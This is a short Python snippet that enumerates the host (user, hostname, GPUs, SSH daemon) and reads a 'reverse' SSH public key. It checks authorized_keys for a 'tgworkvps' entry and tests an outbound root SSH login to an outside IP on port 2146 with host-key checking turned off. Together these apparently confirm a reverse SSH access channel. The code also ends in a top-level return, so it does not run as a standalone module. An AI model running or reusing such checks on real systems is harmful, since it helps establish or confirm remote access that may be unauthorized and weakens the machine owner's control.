import subprocess, os
def run(cmd):
    try: return subprocess.check_output(cmd, shell=True, timeout=10, stderr=subprocess.STDOUT).decode().strip()
    except Exception as e: return str(e)
r = []
r.append("USER:" + run("whoami"))
r.append("HOST:" + run("hostname"))
r.append("GPU:" + run("nvidia-smi -L 2>&1 | head -2"))
r.append("SSHD:" + run("ss -tlnp | grep :22 | head -1"))
r.append("PUBKEY:" + run("cat ~/.ssh/id_ed25519_reverse.pub 2>/dev/null || echo NONE"))
r.append("VPSKEY:" + ("ADDED" if "tgworkvps" in open(os.path.expanduser("~/.ssh/authorized_keys")).read() else "MISSING"))
r.append("OUTBOUND:" + run("timeout 5 ssh -o StrictHostKeyChecking=no -o BatchMode=yes -i ~/.ssh/id_ed25519_reverse -p 2146 root@51.195.191.88 echo OK 2>&1 | tail -1"))
return chr(10).join(r)
